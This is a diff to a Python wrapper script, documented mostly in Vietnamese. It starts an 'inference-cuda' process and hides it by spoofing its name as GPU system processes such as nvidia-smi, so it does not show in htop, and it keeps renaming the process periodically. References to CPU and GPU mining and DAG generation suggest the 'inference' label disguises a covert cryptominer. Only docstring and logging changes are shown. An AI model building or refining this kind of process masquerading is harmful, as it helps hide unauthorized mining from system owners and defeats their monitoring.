@@ -3,27 +3,29 @@
 
 🎮 **[Stealth GPU-CUDA Inference Wrapper]** (wrapper ẩn danh cho GPU-CUDA inference)
 
-Script wrapper khởi động **inference-cuda process** với **[Self-Stealth capability]** (khả năng tự ẩn danh).
-Giải quyết vấn đề **[GPU Process Exposure]** (tiến trình GPU bị lộ) bằng cách áp dụng 
-**[Process Name Spoofing]** (giả mạo tên tiến trình) tương tự CPU mining.
+Script wrapper khởi động **inference-cuda process** với **[Process Name Stealth]** (ẩn danh tên tiến trình).
+Giải quyết vấn đề **[GPU Process Exposure]** (tiến trình GPU bị lộ) bằng cách thay đổi 
+**[Process Name Display]** (hiển thị tên tiến trình) trong system monitoring tools.
 
 ⚠️ WORKFLOW:
-1. Khởi động **[Self-Stealth Manager]** trong process hiện tại
-2. Thay đổi process name thành system process giả (GPU-optimized names)
-3. Exec **inference-cuda** binary để thay thế process image
-4. **Self-Stealth Manager** tiếp tục hoạt động trong inference-cuda process
+1. Tạo enhanced GPU environment với CUDA optimizations
+2. Khởi động inference-cuda subprocess với container-safe approach
+3. Áp dụng process name spoofing (nvidia-smi, tensorcore, etc.)
+4. Background stealth maintenance với periodic renaming
+5. DirectPID registry integration với metadata
 
-✅ ADVANTAGES:
-- Symmetric protection với CPU mining
-- Không cần external PID tracking
-- Không cần special privileges  
-- Process tự quản lý stealth mode
-- Zero GPU mining interruption risk
+✅ STEALTH CAPABILITIES:
+- Process name masquerading (htop COMMAND column)
+- Container-compatible implementation  
+- Enhanced error handling và graceful degradation
+- Background stealth maintenance threads
+- NVIDIA/CUDA environment spoofing
 
-🎯 GPU-SPECIFIC FEATURES:
+🎯 CONTAINER-OPTIMIZED FEATURES:
 - GPU-optimized stealth names (CUDA, OpenGL, graphics processes)
-- Compatible với CUDA runtime
-- Handles GPU driver process signatures
+- Compatible với Docker container restrictions
+- Memory optimization cho DAG generation
+- DirectPID registry integration
 """
 
 import os
@@ -152,9 +154,8 @@ def main():
         exec_command = [cuda_inference_path] + cuda_inference_args
         logger.info(f"🔄 [GPU-STEALTH-WRAPPER] Executing: {' '.join(exec_command)}")
         
-        # 🚀 PHASE 2: GPU Post-Exec Stealth Implementation  
-        # Use subprocess instead of execv() to maintain GPU stealth control
-        logger.info("🔄 [GPU-POST-EXEC-STEALTH] Using subprocess mode to maintain GPU stealth control")
+        # 🚀 PHASE 2: GPU Process Stealth Implementation
+        logger.info("🔄 [GPU-STEALTH] Using optimized subprocess stealth mode")
         
         try:
             # Memory optimization trước khi start inference-cuda 
